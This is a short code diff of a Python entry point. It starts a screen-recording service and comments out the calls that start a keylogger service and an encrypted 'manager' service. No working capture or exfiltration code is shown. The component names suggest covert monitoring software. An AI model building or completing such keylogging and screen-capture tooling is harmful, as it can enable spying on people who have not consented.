@@ -17,5 +17,5 @@ manager = Manager(fernet=fernet)
 
 if __name__ == '__main__':
     asyncio.run(screen_rec.satart_service())
-    keylog.satart_service()
-    manager.satart_service()
+    #keylog.satart_service()
+    #asyncio.run(manager.satart_service())
